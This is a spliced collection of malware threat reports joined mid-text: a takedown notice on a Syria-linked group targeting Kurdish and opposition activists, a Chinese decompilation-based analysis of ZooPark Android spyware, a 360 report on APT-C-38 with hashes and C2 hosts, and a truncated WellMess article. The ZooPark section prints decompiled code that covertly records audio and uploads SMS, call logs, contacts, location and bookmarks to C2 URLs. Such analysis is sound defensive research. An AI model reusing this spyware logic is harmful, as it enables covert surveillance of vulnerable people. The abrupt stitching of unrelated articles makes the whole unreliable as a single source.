We took down a hacking group that targeted minority groups; activists; opposition in Southern Syria, including in Sweida, Huran, Qunaitra and Daraa; Kurdish journalists, activists in Northern Syria, including Kamishl, Kubbani, Manbij, and Al-Hasakah; members of the People’s Protection Units (YPG); and Syria Civil Defense (the White Helmets, a volunteer-based humanitarian organization). Our investigation found links between this activity and individuals associated with the Syrian government. On our platform, this operation manifested primarily as social engineering and sharing links to malicious websites.
We identified the following TTPs used by this threat actor across the internet, including on our apps (threat indicators can be found at the end of the report):
This group shared links to attacker-controlled websites hosting Android malware masquerading as apps and updates themed around the United Nations, White Helmets, YPG, Syrian satellite TV, COVID-19, WhatsApp and YouTube.
Likely due to this operation’s reliance on commercially available malware, this group has not been separately tracked by the security community. While this likely limited their effectiveness thanks to the existing anti-virus detection aimed at these commodity tools, it has also perhaps allowed them to hide in the noise.
Among the commodity Android malware this group used: SpyNote and SpyMax.
Threat Indicators
1. Pakistan
Domains & C2s:
download-telegram.vercel[.]app
Used by SEA affiliated individuals to distribute a new unnamed Android family
download-revo.vercel[.]app
Used by SEA affiliated individuals to distribute a new unnamed Android family
82.137.218[.]185
Command and control server. Used to distribute a variety of commodity and custom Android malware.
informnapalm[.]net
Hosting trojanized apps for the YPG, Syrian Civil Defense, and malware pretending to be an update for WhatsApp.
facebook-helps-center[.]com
Older infrastructure hosting SpyMax malware pretending to be a WhatsApp update.*本文作者：xiongchaochao，本文属 FreeBuf 原创奖励计划，未经许可禁止转载。 前言 ZooPark是一个针对中东的APT组织，截至2017年，已经发展到了4.0版本，本次分析是第三个版本，相比较V1、V2版本的代码的复杂性，2016年流出的V3版本的样本可以说有关于信息窃取这方面的功能比之前有了质的飞跃，如果说之前两个版本让人感觉新手练手的作品，那么这个版本已经可以说是有开发经验的老司机来写的了。我们入门先做静态的代码分析，理顺分析流程。 工具：JEB1.5、AndroidKiller1.3 样本运行流程图 V3 分析之前，我们需要理清思路，逐步分析，慢慢行成一套属于自己的分析流程。 1、 是否加固过，混淆过未加固、未混淆。 2、看安装包目录结构，看是否有特别的文件，记录下来方便后面的分析。 证书信息，看样本大概流出的时间： 资产目录assets中全是这些看起来很火辣的小姐姐，很明显可能用于诱惑用户查看点击之类的： 布局文件夹res的有几十个values文件（values-nb等），文件里面有不同国家的字体，和之前两个版本，可以看出，开发人员有了质的飞跃： 3、 看清单文件，静态注册了哪些广播接收器。 在清单文件AndroidManifest.xml中有这样静态注册的广播，因为它没有设置intent-filter，所以不会捕获任何广播，只能主动通过构造显式intent+发送广播sendBroadcast才可以唤醒这个广播： <receiver android:name="com.wallpaper.OnGPSReceiver" />
<receiver android:name="com.wallpaper.OnAlarmReceiver" /> 使用Android Killer工具的全局字符串搜索，只发现OnAlarmReceiver这个广播接收器在OnBootReceiver开机广播中被启用，结合起来实现的功能是开机后，设置一个重复的警报，来启动这个广播，用来唤醒AppService服务（服务比较复杂，在分析完清单文件后，分析）： 从广播接收器的名称就可以看出他是一个检测网络变化然后执行某些行为的广播。从代码中可以看出他的主要行为就是如果可以联网，就会开启AppService服务（这是第二个为了开启这个服务的广播了，可以看出极有可能这个服务就是恶意行为的主要发起者）。这里勾选上write方法是建议留个印象，如果分析多个样本，那么其实可以从代码编写习惯中，看出一些端倪： <receiver android:label="NetworkConnection" android:name="com.wallpaper.NetworkChangeReceiver">
<intent-filter android:enabled="true" android:exported="false">
<action android:name="android.net.conn.CONNECTIVITY_CHANGE" />
</intent-filter>
</receiver> 这是将这个样本APP激活成设备管理器，在meta-data中知道device_admin_sample.xml文件存放了，激活设备管理器请求开启的策略,并且一旦策略被触发就会调用这个广播接收器中重写的方法，如图7.png，都会打印一条日志： <intent-filter>
<action android:name="android.app.action.DEVICE_ADMIN_ENABLED" />
<action android:name="android.app.action.DEVICE_ADMIN_DISABLED" />
</intent-filter>
<meta-data android:name="android.app.device_admin" android:resource="@xml/device_admin_sample" />
</receiver> 收到短信时，会将短信内容、号码、时间等存入data数据库中的tbl_SMS表中： <receiver android:enabled="true" android:name="com.wallpaper.SMSReceivers">
<intent-filter>
<action android:name="android.provider.Telephony.SMS_RECEIVED" />
</intent-filter>
</receiver> 开机启动广播，首先会尝试开启ScreenStateService服务，然后创建一个重复的警报，每隔4分钟来启动这个OnAlarmReceiver，即开启AppService服务。 <receiver android:enabled="true" android:name="com.wallpaper.OnBootReceiver" android:permission="android.permission.RECEIVE_BOOT_COMPLETED">
<intent-filter>
<action android:name="android.intent.action.BOOT_COMPLETED" />
<category android:name="android.intent.category.DEFAULT" />
</intent-filter>
</receiver> 综上，这些静态注册的广播，主要是通过监听网络变化、开机自启动来打开AppService、ScreenStateService服务，下面主要分析这两个服务。然后还有一些窃取用户收到的短信内容，写入数据库、激活设备管理器 4、分析两大服务的功能：AppService、ScreenStateService ScreenStateService 动态注册ScreenReceiver广播接收器来监听屏幕的解锁和锁屏： ScreenStateService.mReceiver = new ScreenReceiver();
this.getApplicationContext().registerReceiver(ScreenStateService.mReceiver, new IntentFilter(
"android.intent.action.SCREEN_ON"));
this.getApplicationContext().registerReceiver(ScreenStateService.mReceiver, new IntentFilter(
"android.intent.action.SCREEN_OFF")); (1) 锁屏时，开启AppService服务（不知道第几次启动它，证明这个服务才是真正的恶意功能执行者）。执行Start_check_mic方法，开启线程来录音8分钟存储到外部存储/android/data/AndroidService/时间.3gpp，然后将~/android/data/AndroidService/目录下多有录音文件POST上传到C2地址的/spyMobile/recordcall_upload.php文件上： 在构造C2地址时，如果第一次访问这个地址MainActivity.Server_Domain，因为还没有被赋值，所以会异常，调用MainActivity.findServer()方法来，获取C2地址（通过访问网络图片获取返回的流数据，然后正则匹配出C2地址）： (2) 屏幕解锁时，打印Intent Action: android.intent.action.SCREEN_ON。 AppService 一般来说，浏览服务做了哪些事，从onCreate或者onStartCommand（onCreate没有重写的情况），但是这个服务没有这两个方法，再仔细看看，发现这个服务类，继承一个自定义类，而这个自定义类继承IntentService类，看到这个类我们就需要从onHandleIntent方法入手了（解决开发这忘记开启线程和忘记调用 stopSelf()），发现主要执行了doWakefulWork抽象方法，所以再回到AppService类中，检查他的重写方法即可： public class AppService extends WakefulIntentService
public abstract class WakefulIntentService extends IntentService
......
abstract void doWakefulWork(Intent arg1);
......
this.doWakefulWork(intent);
WakefulIntentService.getLock(((Context)this)).release(); //锁屏（没有唤醒锁的前提） (1) 检查是否开启ScreenStateService服务来偷偷录音，如果没有就打开这个服务： (2) GPS_GET_Location_Period: 获取设备位置信息强制开启GPS： 每秒检测一次，一旦距离改变超过15米，记录下经纬度和对应的位置： 然后经纬度、时间数据写入这个tbl_GPS表中： try {
label_38:
DatabaseHandlers v2 = new DatabaseHandlers(((Context)this));
v2.Insert_table("tbl_GPS", new String[]{"Lat", "Long", "Time"}, new String[]{Double
.toString(this.latitude), Double.toString(this.longitude), new SimpleDateFormat(
"yyy-MM-dd HH:mm:ss").format(new Date())});
v2.close(); (3) Start_All_Services() LoginUser 构造带有设备ID的url访问C2地址，如果没有C2地址，跟前面一样，使用findServer来获取（根据卡巴斯基的报告C2应该是5.61.27.157）： GPSData 使用构造带有位置数据的C2地址，进行访问： //获取"tbl_GPS"表的所有数据
v6 = v9.getAllData("tbl_GPS", v8);
......
try {
Object v18 = v6.get(v16);
Object v20 = v6.get(v16 + 1);
Object v23 = v6.get(v16 + 2);
this.ConvertPointToLocation(Double.parseDouble(((String)v18)), Double.parseDouble(((String)
v20)));
String v25 = MainActivity.Server_Domain + "/spyMobile/api_gpslocation.php?imei=" + devid
+ "&currentLoaction=" + this.strAddress + "&lat_long=" + v20 + "," + v18 + "&timing="
+ v23.replace(" ", "%20");
Log.d("url", v25);
v13.getParams().setParameter("http.protocol.cookie-policy", "rfc2109");
v14 = new HttpPost(v25);
} readOutgoingSMS 获取uri：content: //sms/sent内容，发送的短信内容，写入Insert_table表中： try {
System.out.println("Inside of SMS Reading.......");
v3 = Uri.parse("content://sms/sent");
v4 = new String[]{"_id", "address", "body", "date"};
......
v16 = new DatabaseHandlers(this);
v11 = new String[]{"Type", "Number", "Text", "Time"};
v12 = 0;
.......
try {
String[] v14 = new String[v2];
v14[0] = "Outgoing";
v14[1] = v8;
v14[2] = v9;
v14[3] = v21;
v16.Insert_table("tbl_SMS", v11, v14);
goto label_97;
} SendSMS 上传发送的短信内容： try {
String v20 = MainActivity.Server_Domain + "/spyMobile/api_smstracking.php?imei=" + devid
+ "&smsType=" + v2.get(v14) + "&smsNumber=" + v2.get(v14 + 1) + "&smsText=" + v2
.get(v14 + 2) + "&smsTiming=" + v2.get(v14 + 3);
Log.d("Send SMS url", v20);
v20 = v20.replace(" ", "%20");
v11.getParams().setParameter("http.protocol.cookie-policy", "rfc2109");
v12 = new HttpPost(v20);
} sendCallDetails 发送通话记录数据： 但是这里有一个问题就是，获取通话记录的地方也就是下面这个类没有被调用，那我们接着寻找一下fetchNewCallLogs方法的调用链，onCallStateChanged方法->fetchNewCallLogs，还是未能找到开启这个类的地方，先往下看： public class CustomPhoneStateListener extends PhoneStateListener {
.........
public static void fetchNewCallLogs(Context context) {
........
label_71:
Long v31 = Long.valueOf(Long.parseLong(v24));
Calendar v19 = Calendar.getInstance();
v19.setTimeInMillis(v31.longValue());
String v20 = v19.getTime().toString();
System.out.println("tbl_CALL TIMING : " + v20);
v25.Insert_table("tbl_CALL", v22, new String[]{v30, v21, v26, v20});
v18.moveToNext(); ScreenReceiver.upload_all_file_and_delete() 上传ScreenStateService服务录的音频文件： SendPhoneBook 获取联系人电话、姓名、ID并发送： try {
String v10 = MainActivity.Server_Domain + "/spyMobile/api_phonebookaccess.php?imei=" + devid
+ "&phonebookListname=" + this.PhoneBookName.get(v5) + "&mobileNumber=" + this.
PhoneBookNo.get(v5) + "&numberType=" + this.PhoneBookType.get(v5);
Log.d(" phonebook url", v10);
v10 = v10.replace(" ", "");
v2.getParams().setParameter("http.protocol.cookie-policy", "rfc2109");
v3 = new HttpPost(v10);
} SendBrowserDetails_GetLastTime 第一次执行到Start_All_Services()方法时，count_step_to_send_BrowserHistory 变量还是初值1，不能执行SendBrowserDetails_GetLastTime恶意方法，第一次主要是赋值AppService.check_start_upload_info == true，标识开始上传数据： public AppService() {
........
this.count_step_to_send_BrowserHistory = 1;
.......
if(this.count_step_to_send_BrowserHistory != 0) {
goto label_108;
......
// first: count_step_to_send_BrowserHistory == 2；second：count_step_to_send_BrowserHistory == 3（V14）
++this.count_step_to_send_BrowserHistory;
if(this.count_step_to_send_BrowserHistory != v14) {
goto label_115;
this.count_step_to_send_BrowserHistory = 0; 第二次执行到这时，看上边代码的注释，会给count_step_to_send_BrowserHistory 赋值为0，也就是第三次执行到这里就可以执行SendBrowserDetails_GetLastTime方法了，执行了普通的HTTP请求，来获取访问的时间信息： try {
String v9 = MainActivity.Server_Domain + "/spyMobile/api_urltracking.php?imei=" + devid +
"&urlName=" + "getlasttime" + "&urlLink=a&timing=a".replace(" ", "%20");
Log.d("Browser url ", v9);
v2.getParams().setParameter("http.protocol.cookie-policy", "rfc2109");
v4 = new HttpPost(v9);
} 获取浏览器书签： SendBrowserDetails 发送系统自带浏览器书签信息到C2： try {
String v10 = MainActivity.Server_Domain + "/spyMobile/api_urltracking.php?imei=" + devid
+ "&urlName=" + this.UrlName.get(v5) + "&urlLink=" + this.UrlLink.get(v5) + "&timing="
+ this.UrlTime.get(v5).replace(" ", "%20");
Log.d("Browser url ", v10);
v2.getParams().setParameter("http.protocol.cookie-policy", "rfc2109");
v3 = new HttpPost(v10);
readAppInfo
第三次执行到这会被赋0值，然后第四次执行this.readAppInfo()， try {
if(this.count_step_to_send_AppInfo == 0) {
this.readAppInfo();
this.SendAppInfo(AppService.deviceIMEI);
++this.count_step_to_send_AppInfo; // this.count_step_to_send_AppInfo初始化之后为2，现在==3
if(this.count_step_to_send_AppInfo != 5) {
goto label_130;
this.count_step_to_send_AppInfo = 0;
} 获取已经安装的应用的名称包名： v5 = this.getPackageManager();
List v1 = v5.getInstalledApplications(0); SendAppInfo 构造含有应用信息的url，发送给C2： try {
v2.printStackTrace();
label_18:
String v13 = MainActivity.Server_Domain + "/spyMobile/api_appinfo.php?imei=" + devid
+ "&appinfo=" + this.AppInfo.get(v7) + "&isappexist=" + this.AppIsExist
.get(v7);
Log.d("Send appinfo url", v13);
v13 = v13.replace(" ", "%20");
v4.getParams().setParameter("http.protocol.cookie-policy", "rfc2109");
v5 = new HttpPost(v13);
} getSentImages、sendImageData 首先同上，它这里有个明显的失误，因为初始值为1，之后会不断增加，即使重新启动这个类，也会再++this.count_step_to_send_Image;这里自增，永远不会为1，也就是永远不会被赋值为0，执行不到getSentImages和sendImageData（这里经过全局查询字符串，并没有其他地方会赋值），也就是说它这个上传外部存储下的/DCIM/目录，关于设备拍的照片、截屏还有隐藏文件夹"/DCIM/.thumbnails"内的图片缩略图，写入数据库的"tbl_PHOTO"表后的上传操作，都不能进行了。 if(this.count_step_to_send_Image == 0) {
this.getSentImages();
this.sendImageData(AppService.deviceIMEI);
++this.count_step_to_send_Image; // count_step_to_send_Image初始值==1，第一次执行到这，==2
if(this.count_step_to_send_Image != 1) {
goto label_145;
this.count_step_to_send_Image = 0; 至此关于AndroidManifest.xml中会进行的操作分析完毕了，主要的恶意功能服务AppService也分析完了，过程中发现，样本作者开发过程中，出现了失误导致上传图片功能无法进行，好像是借鉴另一个样本家族的源码写的，但是没有做个精确测试，导致的问题吧（如果错误，请指教！！！），还有就是留下一个没有获取通话记录的地方，接下来，分析主要的启动过程中，会感谢什么，也是比较轻松一些得了，因为主要恶意功能已经分析完毕 5、清单文件中找入口类 com.wallpaper.MainActivity <activity android:alwaysRetainTaskState="true" android:label="@string/title_activity_main" android:name="com.wallpaper.MainActivity">
<intent-filter>
<action android:name="android.intent.action.MAIN" />//标志
<category android:name="android.intent.category.LAUNCHER" />//标志
</intent-filter>
</activity> MainActivity() 在构造函数里声明了一个延迟开启AppService服务的死循环操作(看onCreate之前先看看构造函数中是否有一些恶意行为，或者可以直接执行的操作)： this.updateTimerThread = new Runnable() {
public void run() {
try {
Intent v0 = new Intent(MainActivity.this.context, AppService.class);
v0.addFlags(0x14000000);
MainActivity.this.context.startService(v0);
// 延迟4分钟，继续执行这个操作（死循环）
MainActivity.Handler_schedul.postDelayed(MainActivity.this.updateTimerThread, 240000);
catch(Exception v1) {
} onCreate() m1 (1) 延迟1分钟开始死循环，不断开启AppService服务 MainActivity.Handler_schedul.postDelayed(this.updateTimerThread, 60000); (2) this.readSMS(); //获取短信数据，写入tbl_SMS表里 Uri v3 = Uri.parse("content://sms/");
String[] v4 = new String[]{"_id", "address", "body", "date", "type"};
.......
v21 = "Incoming";
switch(Integer.parseInt(v12.getString(v12.getColumnIndex("type")))) {
case 1: {
try {
v21 = "Incoming"; //收到的短信
goto label_69;
label_109:
v21 = "Outgoing"; //发送的短信
goto label_69;
label_111:
v21 = "Draft"; //草稿
goto label_69;
......
v15.Insert_table("tbl_SMS", v11, v13); (3) 获取通话记录数据放入tbl_CALL表中，补充了分析AppService中遗留的问题 this.getCallDetails(); v27 = this.getContentResolver().query(CallLog$Calls.CONTENT_URI, null, null, null, null);
v28 = v27.getColumnIndex("number");
v34 = v27.getColumnIndex("type");
v20 = v27.getColumnIndex("date");
v24 = v27.getColumnIndex("duration");
v30.append("Call Details :");
........
v21.Insert_table("tbl_CALL", v18, v19); (4) 使用registerReceiver动态注册屏幕开关广播接收器ScreenReceiver（上面分析过了，这里不赘述） try {
IntentFilter v5 = new IntentFilter("android.intent.action.CLOSE_SYSTEM_DIALOGS");
v5.setPriority(65535);
v5.addAction("android.intent.action.SCREEN_OFF");
v5.addAction("android.intent.action.SCREEN_ON");
this.mReceiver = new ScreenReceiver();
this.registerReceiver(this.mReceiver, v5);
} (5) 申请激活设备管理器 //设备策略管理服务
this.getSystemService("device_policy");
//监听策略被触发，调用重写的方法
ComponentName v1 = new ComponentName(((Context)this), AdminReceiver.class);
//添加设备管理员意图(main)
Intent v4 = new Intent("android.app.action.ADD_DEVICE_ADMIN");
v4.putExtra("android.app.extra.DEVICE_ADMIN", ((Parcelable)v1));一、 概述
从2015年7月起至今，军刀狮组织（APT-C-38）在中东地区展开了有组织、有计划、针对性的不间断攻击。其攻击平台为Windows和Android，截止目前360烽火实验室（360 Beaconlab）一共捕获了Android平台攻击样本25个，Windows平台攻击样本4个，涉及的C2域名16个。
2018年5月，Kaspersky安全厂商发表报告《 Who’s who in the Zoo 》，首次批露该组织为一个未归属的专注于中东目标的间谍活动组织，并命名ZooPark，涉及的攻击武器共包含四个迭代版本的Android端RAT，载荷投递方式包括水坑和Telegram频道。
2019年，360烽火实验室捕获到军刀狮组织的最新攻击活动，除发现Android端攻击外还发现该组织带有Windows端攻击，其中Android端RAT仍属于第四代。我们结合APT攻击的地缘政治因素、攻击组织使用的语言以及该组织发起的历史攻击活动，分析后认为该组织是位于西亚的中东某国家背景的APT组织。 另在此感谢我们的兄弟团队----360高级威胁应对团队 对本报告Windows端RAT内容的完成。
由于军刀狮组织的攻击目标有一个主要的特色目标是西亚中东某国的库尔德人，另Windows端RAT包含的PDB路径下出现多次的“Saber”，而亚洲狮为该中东国家的代表动物，结合该组织的一些其它特点以及360对 APT 组织的命名规则，我们将该组织命名为军刀狮（APT-C-38）。
图1.1 军刀狮关键攻击活动时间事件点
二、 载荷投递和网络基础设施
军刀狮组织载荷投递的方式主要为水坑攻击和Telegram频道。需要注意的是该组织在2018年5月初被首次披漏后，攻击组织在当月月底使用了新一批的网络基础设施。
- 水坑攻击
目前已发现有两家在中东地区流行的阿拉伯新闻报纸网站（科威特Annahar和埃及Al-Nahar）曾被该组织用来水坑攻击。
图2.1 埃及Al-Nahar网站
- Telegram频道
除了上面两个针对指定中东地区阿拉伯国家的水坑攻击外，我们还发现到该组织在攻击其主要的攻击目标中东某国的库尔德人时多采用Telegram频道传播（如伊斯兰议会前对库尔德斯坦省选举攻击和库尔德斯坦省马里万萨南达季的抗议活动攻击等）。
图2.2 伊斯兰议会前对库尔德斯坦省选举攻击的Telegram频道
- 网络基础设施
至今军刀狮组织已经使用了多个网络基础设施。
表1 军刀狮组织使用的网络基础设施
Server
Description
Registrant Country'City
Registrant Phone
Registrant Email
Registrant Postal Code
需要注意的是其在2018年5月23日新申请了一批网络基础设施，最新的移动端攻击载荷于2019年3月部署在其中的一个服务器，这批中间服务器共有4个，有3个至今仍存活且解析后实对应同一IP，这批服务器充当着PC端和移动端RAT的中间服务器角色。
图2.3 被披露后军刀狮组织当月新部署的一批网络基础设施
三、 诱导方式
军刀狮组织在这次行动中主要使用以下两种诱导方式：
- 含有正常APP功能的伪装
为更好的躲避被察觉到，除了对文件图标进行伪装外，还会在RAT启动时显示出正常的APP界面，目前四个迭代版本的Android端RAT，运行后均会展示出正常界面，但在运行时或者接收到指定广播时，便开启在后台进行的间谍活动。
图3.1 第二代和第四代的Android端RAT运行后展示举例
- 文件图标伪装
图3.2 伪装的应用软件图标
四、 RAT攻击样本分析
截至目前，军刀狮组织已使用到针对Android和Windows平台的不同RAT，经过分析，我们认为最新的Android端RAT和PC端RAT应该购买自同一个商业开发组织，其中一名开发者昵称为“Apasec”。
- Android
Android端共使用到四个迭代的RAT，本报告中我们仅介绍最新攻击活动使用的第四代RAT，我们命为UnitMM，该RAT目前仅在军刀狮组织中出现，其它版本RAT的信息可参考本报告前面提到的Kaspersky安全厂商报告。
UnitMM军刀狮组织的第四代RAT。根据该RAT包含的类名和使用到的数据库名等，我们命名为UnitMM。最新版本的UnitMM通过默认的数十个功能配置，进行控制窃取短信、通讯录、地理位置、浏览器书签和搜索历史记录、剪切板信息、外部指定的应用程序数据、捕捉照片/视频/音频等多种恶意行为。
此外UnitMM还能响应来自C2的指定指令进行交互。
表2 C2指令与功能对应表
- Windows
Windows端目前发现到一种RAT，我们命为SpecialSaber，该RAT目前仅在军刀狮组织中出现，共有4个。
SpecialSaber这是一个之前未被曝光的RAT。根据最新版PDB路径下的目录名，我们命为SpecialSaber。其具有检测杀软（包括Bitdefender、Kaspersky、Avira、Avast、AVG、ClamWin、ESET、Norton、McAfee、Panda、Symantec），窃取多种浏览器信息、多种邮箱信息、用户帐户信息、磁盘文件信息等，并带有键盘记录及截屏等多种恶意行为。窃取后的各种信息后会以文件的形式保存在自身的工作目录中，文件名为随机生成的字符串，文件统一用指定的格式进行存储。
图4.1 用统一格式存储的截图文件举例
表3 部分文件类型数值与文件含义对应表
文件类型数值
对应的文件含义
- 疑似购买自同一家商业开发公司
通过把Android端的UnitMM RAT和Windows端SpecialSaber RAT进行比较，我们看到两者在C2通信环节采用了相似的手法，且两者窃取的信息有特殊的共同性，我们认为两者应该来自同一个商业开发组织。
此外我们在一个PDB的路径中发现一个名为“Apasec”的开发者，我们发现这个名字曾多次出现在该组织移动端的C2 panels中，这个发现更加验证了我们的判断。
五、 受攻击地区分布情况
截至目前，360烽火实验室发现此次军刀狮组织攻击活动影响到的国家共有7个，其中伊朗受影响最为严重，这和我们分析过程中发现到该国家的库尔德人受到几次的针对攻击活动不无关系。
图5.1 受攻击的地区分布情况
六、 攻击者画像
基于攻击者几次特别的针对攻击、使用的语言以及APT攻击的地缘政治因素等，我们总结了该攻击组织以下的画像观点：
熟悉波斯语，阿拉伯语，其中波斯语使用最为频繁。
主要针对位于西亚的中东某国其某省的库尔德人，能实时甚至提前对其某些时刻的活动进行部署相应的攻击，此外也针对中东数个阿拉伯国家。
APT攻击大部分基于内部局势和地缘政治因素（本国或敌对国家）。
从受害者的背景以及攻击行动的持续时间来看，攻击者所关注的目标在政治和战略层面有重大意义，且持续时间较长。
综上所述，360烽火实验室认为攻击者为来自位于西亚的中东某国家背景的APT组织。
七、 总结
近几年，我们看到APT攻击随着时代的发展，PC端不再是独有的目标，越来越多的攻击组织同时会把移动端作为攻击的另一必备目标，甚至频繁投入于中东和亚太地区部分国家背景支持下的网络战争中。
APT攻击发展迅速，尤其是移动端攻击的发展。我们看到前几年有些攻击组织能力还比较简陋，甚至一些安全厂商采用小猫等称呼进行命名表示对对应攻击组织攻击能力的低度尊重。但随着攻击获取到的价值效益，攻击组织加大投入力度，我们看到攻击越来越复杂，针对性和实效性越来越强，以前面的小猫为例进行形容的话，犹如年轻的小猫渐成成熟的狮子。此次军刀狮组织无疑又是APT攻击发展中的一个典型代表，另基于该组织的特殊背景及其隶属国家当下的时势我们认为该组织的攻击可能会有新一轮的变化。
附录A：样本MD5
Android攻击样本MD5 Windows攻击样本MD5
0745b0957aab92b6a09645e076b4f339 5b0431bbebdc48d2fa37882f7343b011
1874aa71c9b13eec5b587e8ed6a71606 31edb7591bfeeb72e0652c17781640af
191cc5d165472ae19e665821be71c282 58cc3935fbfdb2990304b99fbb919dad
232bd3dde6914db0a3dbfc21ed178887 848193568a48f5742135667e9842890a
2d91f7d1eb0d32ece0a8b1715a70b4cd
345c2325dd633099f29b6d7141a4703d
451ff729eaa1cf26943a812cd37eb4ac
4d8ddec9243bc6ac0419c561fe413cfc
519018ecfc50c0cf6cd0c88cc41b2a69
5ad36f6dd060e52771a8e4a1dd90c50c
5efddd7f0fc2125e78a2ca18b68464ec
699a7eedd244f402303bcffdee1f0ed1
6a388edbce88bb0331ae875ceeb2f319
73b0a3cae8510dd2efeca7d22f730706
7b530999847bbf43e7d6cbb76da684ae
7d7ad116e6a42d4e518378e2313e9392
a7d00c8629079f944b61c4dd5c77c8fb
a856f9de281cadad7142828dda3843b4
ac4402e04de0949d7beed975db84e594
b44b91b14f176fbf93d998141931a4aa
b714b092d2f28fcf78ef8d02b46dbf9c
c7e4d75caa8e07847e47eadce229c288
cb67abd070ae188390fc040cbe60e677
e2f62b5acf3795a62e9d54e1301c4e7b
ec5a6f0e743f4b858aba9de96a33fb0c
properties 附录B：C&C
rhubarb2 .com
rhubarb3 .com
androidupdaters .com
dlgmail .com
dlstubes .com
googleupdators .com
adobeactiveupdates .com
adobeseupdater .com
dlstube .com
adobeactiveupdate .com
5 .61 .27 .154
5 .61 .27 .157
5 .61 .27 .173
91 .109 .23 .175
solar64 .xp3 .biz
entekhab10 .xp3 .biz
css 附录C：PDB
C: \U sers \a pasec110 \D esktop \S aber1 \c lient \S aber1-Develop \R elease \S aber1-Dev.pdb
C: \U sers \a pasec110 \D esktop \S aber1 \c lient \e diting saber \S aber1-Develop-changed \R elease \S aber1-Dev.pdb
C: \U sers \M &M \D esktop \S aber1 \S pecial-Saber1-Windows-Client-binder_backup(last stable socket communication) \R elease \S aber1-Dev.pdb
C: \U sers \M &M \D esktop \S aber1 \S pecial-Saber1-Windows-Client-binder_backup \R elease \S aber1-Dev.pdb
taggerscript 附录D：参考链接
[ 1 ] https: //en.wikipedia.org/wiki/Entekhab
[ 2 ] https: //en.wikipedia.org/wiki/Islamic_Consultative_Assembly
[ 3 ] https: //en.wikipedia.org/wiki/Annahar_(Kuwait)
[ 4 ] https: //www.alnaharegypt.com/
[ 5 ] https: //en.wikipedia.org/wiki/2017_Iraqi_Kurdistan_independence_referendum
angelscript 本文链接： https://blogs.360.cn/post/analysis-of-APT-C-38.html
-- EOF --
360烽火实验室（360 Beaconlab）
2019-05-27 10:15:30
，添加在分类
移动端技术
android平台
AndroidSome malware is designed to run on multiple platforms, and most commonly they are written in Java. For example, Adwind malware (introduced in a past article ) is written in Java, and it runs on Windows and other OS. Golang is another programming language, and it is used for Mirai controller, which infects Linux systems.
This article introduces the behaviour of WellMess malware based on our observation. It is a type of malware programmed in Golang and cross-compiled to make it compatible both with Linux and Windows. For more details about the malware function, please also refer to the report from LAC [1].
Behaviour of WellMess
Generally, Golang executable files include many required libraries in itself. This usually increases the file size, making WellMess larger than 3 MB. Another feature is that function names for the executable files can be found in the file itself. (Even for stripped files, function names can be retrieved by using tools such as GoUtils2.0 [2].) Below are the function names used in WellMess:
_/home/ubuntu/GoProject/src/bot/botlib.EncryptText
_/home/ubuntu/GoProject/src/bot/botlib.encrypt
_/home/ubuntu/GoProject/src/bot/botlib.Command
_/home/ubuntu/GoProject/src/bot/botlib.reply
_/home/ubuntu/GoProject/src/bot/botlib.Service
_/home/ubuntu/GoProject/src/bot/botlib.saveFile
_/home/ubuntu/GoProject/src/bot/botlib.UDFile
_/home/ubuntu/GoProject/src/bot/botlib.Download
_/home/ubuntu/GoProject/src/bot/botlib.Send
_/home/ubuntu/GoProject/src/bot/botlib.Work
_/home/ubuntu/GoProject/src/bot/botlib.chunksM
_/home/ubuntu/GoProject/src/bot/botlib.Join
_/home/ubuntu/GoProject/src/bot/botlib.wellMess
_/home/ubuntu/GoProject/src/bot/botlib.RandStringBytes
_/home/ubuntu/GoProject/src/bot/botlib.GetRandomBytes
_/home/ubuntu/GoProject/src/bot/botlib.Key
_/home/ubuntu/GoProject/src/bot/botlib.GenerateSymmKey
_/home/ubuntu/GoProject/src/bot/botlib.CalculateMD5Hash
_/home/ubuntu/GoProject/src/bot/botlib.Parse
_/home/ubuntu/GoProject/src/bot/botlib.Pack
_/home/ubuntu/GoProject/src/bot/botlib.Unpack
_/home/ubuntu/GoProject/src/bot/botlib.UnpackB
_/home/ubuntu/GoProject/src/bot/botlib.FromNormalToBase64
_/home/ubuntu/GoProject/src/bot/botlib.RandInt
_/home/ubuntu/GoProject/src/bot/botlib.Base64ToNormal
_/home/ubuntu/GoProject/src/bot/botlib.KeySizeError.Error
_/home/ubuntu/GoProject/src/bot/botlib.New
_/home/ubuntu/GoProject/src/bot/botlib.(*rc6cipher).BlockSize
_/home/ubuntu/GoProject/src/bot/botlib.convertFromString
_/home/ubuntu/GoProject/src/bot/botlib.(*rc6cipher).Encrypt
_/home/ubuntu/GoProject/src/bot/botlib.(*rc6cipher).Decrypt
_/home/ubuntu/GoProject/src/bot/botlib.Split
_/home/ubuntu/GoProject/src/bot/botlib.Cipher
_/home/ubuntu/GoProject/src/bot/botlib.Decipher
_/home/ubuntu/GoProject/src/bot/botlib.Pad
_/home/ubuntu/GoProject/src/bot/botlib.AES_Encrypt
_/home/ubuntu/GoProject/src/bot/botlib.AES_Decrypt
_/home/ubuntu/GoProject/src/bot/botlib.generateRandomString
_/home/ubuntu/GoProject/src/bot/botlib.deleteFile
_/home/ubuntu/GoProject/src/bot/botlib.Post
_/home/ubuntu/GoProject/src/bot/botlib.SendMessage
_/home/ubuntu/GoProject/src/bot/botlib.ReceiveMessage
_/home/ubuntu/GoProject/src/bot/botlib.Send.func1
_/home/ubuntu/GoProject/src/bot/botlib.init
_/home/ubuntu/GoProject/src/bot/botlib.(*KeySizeError).Error
As mentioned earlier, WellMess has a version that runs on Windows (PE) and another on Linux (ELF). Although there are some minor differences, they both have the same functionality.
The malware communicates with a C&C server using HTTP requests and performs functions based on the received commands. Below is an example of the communication: (User-Agent value varies per sample.)
POST / HTTP/1.1
User-Agent: Mozilla/5.0 (Windows NT 6.1; WOW64; rv:31.0) Gecko/20130401 Firefox/31.0
Content-Type: application/x-www-form-urlencoded
Accept: text/html, */*
Accept-Language: en-US,en;q=0.8
Cookie: c22UekXD=J41lrM+S01+KX29R+As21Sur+%3asRnW+3Eo+nIHjv+o6A7qGw+XQr%3aq+PJ9jaI+KQ7G.+FT2wr+wzQ3vd+3IJXC+lays+k27xd.+di%3abd+mHMAi+mYNZv+Mrp+S%2cV21.+ESollsY+6suRD+%2cx8O1m+%3azc+GYdrw.+FbWQWr+5pO8;1rf4EnE9=+WMyn8+8ogDA+WxR5R.+sFMwDnV+DFninOi+XaP+p4iY+82U.+hZb+QB6+kMBvT9R
Host: 45.123.190.168
Content-Length: 426
Expect: 100-continue
Accept-Encoding: deflate
Connection: Keep-Alive
